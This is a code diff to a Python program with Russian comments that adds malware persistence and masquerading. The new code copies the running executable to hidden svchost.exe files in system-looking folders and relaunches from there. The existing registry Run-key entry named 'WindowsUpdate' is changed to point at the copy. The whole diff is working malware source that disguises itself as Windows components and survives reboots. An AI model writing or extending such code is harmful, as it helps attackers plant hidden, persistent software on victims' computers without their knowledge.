@@ -73,12 +73,56 @@ def rename_to_svchost():
         pass
 rename_to_svchost()
 
-# ============ АВТОЗАГРУЗКА ============
-def auto_persistence():
+# ============ КОПИРОВАНИЕ В ПОСТОЯННОЕ МЕСТО ============
+def copy_to_permanent():
     try:
         exe_path = sys.executable
+        
+        # Проверяем, не запущены ли мы уже из постоянной папки
+        permanent_paths = [
+            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'svchost.exe'),
+            os.path.join(os.environ['PROGRAMFILES'], 'WindowsUpdate', 'svchost.exe'),
+            os.path.join(os.environ['SYSTEMROOT'], 'Temp', 'svchost.exe'),
+        ]
+        
+        for perm_path in permanent_paths:
+            try:
+                perm_dir = os.path.dirname(perm_path)
+                if not os.path.exists(perm_dir):
+                    os.makedirs(perm_dir, exist_ok=True)
+                
+                # Если уже там - возвращаем путь
+                if os.path.exists(perm_path) and os.path.samefile(exe_path, perm_path):
+                    return perm_path
+                
+                # Копируем
+                shutil.copy2(exe_path, perm_path)
+                
+                # Скрываем файл (атрибут Hidden)
+                try:
+                    ctypes.windll.kernel32.SetFileAttributesW(perm_path, 2)
+                except:
+                    pass
+                
+                # Запускаем копию
+                os.startfile(perm_path)
+                sys.exit()
+                
+            except:
+                continue
+        
+        return exe_path
+    except:
+        return sys.executable
+
+# ============ ПЕРЕНЕСЕМ СЕБЯ В ПОСТОЯННОЕ МЕСТО ============
+permanent_path = copy_to_permanent()
+
+# ============ АВТОЗАГРУЗКА (ОБНОВЛЕННАЯ) ============
+def auto_persistence():
+    try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, permanent_path)
         winreg.CloseKey(key)
         return True
     except:
